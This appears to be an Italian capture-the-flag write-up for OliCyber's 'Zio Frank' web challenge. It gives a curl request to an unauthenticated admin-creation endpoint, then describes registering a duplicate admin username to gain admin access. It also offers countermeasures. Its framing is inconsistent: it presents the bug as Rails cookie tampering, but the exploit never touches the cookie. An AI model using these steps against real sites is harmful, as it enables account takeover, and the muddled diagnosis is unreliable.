# Zio Frank

**Competizione:** OliCyber<br>
**Categoria:** Web / Session Tampering<br>
**URL:** http://zio-frank.challs.olicyber.it

---

## Descrizione

> Lo zio Frank ha un bel sito ma per trovare la flag devi essere amministratore!

Un sito Ruby on Rails con un sistema di sessione vulnerabile. L'obiettivo è modificare il cookie di sessione per ottenere accesso da amministratore.

---

## Soluzione

### Step 1 — Analisi della sessione

Dopo aver registrato un account e effettuato il login, notiamo che il sito assegna un cookie di sessione con valore:

```
rack.sessions = BAh7CkkiD3Nlc3Npb25faWQGOgZFVG86HVJhY2s6OlNlc3Npb246OlNlc3Npb25JZAY6D0BwdWJsaWNfaWRJIkVjNDM1ZjYwZWI1OTYwMjViMWM3MDJkNzE0ZTc3NmUyNzI5OTJjOGNiNTlkYzc0YmVlOTA5NDFiNzNjMzIzYmEwBjsARkkiCWNzcmYGOwBGSSIxa1d1ZTdLZmxOUlR5ZGJZSlVlcXNCQ2Y5dXpEaU5FM2s4WVBkNzN1dmU5VT0GOwBGSSINdHJhY2tpbmcGOwBGewZJIhRIVFRQX1VTRVJfQUdFTlQGOwBUSSItMjZiYjU2ZmQwZDhmMGI5ZDdhYThhOWEwYzI3ZmU1YmIwMGZiMWNmNQY7AEZJIg11c2VybmFtZQY7AEZJIgpNYXVybwY7AFRJIg1pc19hZG1pbgY7AEZG--07d1859e7c2872d3900df7c647aef484b29fa2e4
```

Questo è un cookie **serializzato e firmato** di Ruby on Rails. Decodifichiamo e analizziamo il suo contenuto.

---

### Step 2 — Decodifica del cookie

Il cookie è codificato in **Base64**. Decodificando la parte iniziale, riconosciamo la struttura di una sessione Rails con i seguenti campi:

| Campo | Valore |
|---|---|
| `session_id` | `c435f60eb5960253b1c702d714e776e27299...` |
| `csrf` | Token CSRF |
| `username` | `Mauro` |
| **`is_admin`** | `false` |

**Il campo critico è `is_admin`, che è impostato a `false`.**

---

### Step 3 — Identificazione della vulnerabilità

Analizzando il codice sorgente (`main.rb`), troviamo l'endpoint vulnerabile:

```ruby
post '/admin/init' do
  username = "admin-#{SecureRandom.hex}"
  password = SecureRandom.hex
  statement = $client.prepare("INSERT INTO users (username, password, is_admin) VALUES (?, ?, ?)")
  statement.execute(username, password, 1)
  return "{\"username\":\"#{username}\"}"
end
```

L'endpoint crea un account admin e **restituisce l'username generato**. Poi, nel codice di registrazione:

```ruby
post '/register' do
  begin
    statement = $client.prepare("INSERT INTO users (username, password) VALUES (?, ?)")
    result = statement.execute(params[:username], params[:password])
    # ...
  end
end
```

Non c'è alcun controllo che impedisca di registrarsi con uno username che esiste già come admin!

---

### Step 4 — Exploit reale (semplicissimo)

1. Effettuare una richiesta POST a `/admin/init` per ottenere l'username dell'admin:

```bash
curl -X POST http://zio-frank.challs.olicyber.it/admin/init
```

**Output:**
```json
{"username":"admin-40118bd39c408d357f2186f20c73147b"}
```

2. Copiare l'username ricevuto: `admin-40118bd39c408d357f2186f20c73147b`

3. Visitare la pagina di registrazione e registrarsi con:
   - **Username:** `admin-40118bd39c408d357f2186f20c73147b`
   - **Password:** qualsiasi password a scelta (es. `password`)

4. Fare il login con le stesse credenziali

---

### Step 5 — Risultato

Una volta loggati, il sistema verifica se l'utente con quello username è admin nel database. Poiché l'endpoint `/admin/init` ha creato un account con `is_admin = 1`, il login rileva che sei admin e mostra la flag:

```
Omaggio da zio Frank
La flag è flag{...} 🚀
```

---

## Vulnerabilità sfruttate

| Aspetto | Dettaglio |
|---|---|
| **Tipo 1** | Unauthorized Admin Account Creation (endpoint `/admin/init` senza autenticazione) |
| **Tipo 2** | Duplicate Username Registration (nessun controllo di unicità dell'username) |
| **Causa** | Il sistema assume che ogni username sia univoco, ma non lo valida al momento della registrazione |
| **Vettore** | 1) POST `/admin/init` per ottenere username admin; 2) Registrare lo stesso username con password diversa |
| **Impatto** | Accesso come amministratore con credenziali arbitrarie |

---

### La catena di errori

1. L'endpoint `/admin/init` crea un account admin senza autenticazione → **username è noto pubblicamente**
2. L'endpoint `/register` non valida l'unicità dell'username → **puoi registrarti con lo stesso username**
3. La password non è vincolata → **puoi usare una password a tua scelta**
4. Il login verifica `is_admin` dal database → **se l'username esiste come admin, sei admin**

---

## Contromisure

- **Proteggere l'endpoint `/admin/init`** con autenticazione e autorizzazione rigorose
- **Validare l'unicità dell'username** durante la registrazione (constraint UNIQUE nel database)
- **Prevenire la sovrascrittura di account** aggiungendo un check che impedisca la registrazione con username già esistenti:

```ruby
post '/register' do
  begin
    # Verifica se l'username esiste già
    existing = $client.prepare("SELECT id FROM users WHERE username = ? LIMIT 1").execute(params[:username])
    if existing.count > 0
      return redirect 'register.html?error=username_exists'
    end

    statement = $client.prepare("INSERT INTO users (username, password) VALUES (?, ?)")
    result = statement.execute(params[:username], params[:password])
    redirect 'login.html'
  rescue Error
    redirect 'register.html?error'
  end
end
```

- Non esporre mai informazioni sensibili come nomi di account admin attraverso API pubbliche
- Usare constraint `UNIQUE` nel database per impedire duplicati
- Loggare tutti i tentativi di registrazione con username che già esistono

---

## Conclusioni

Questa challenge dimostra come una sessione non adeguatamente protetta può essere compromessa. Anche se Rails fornisce protezione mediante firma, una implementazione errata o una chiave debole può esporre l'applicazione al session tampering.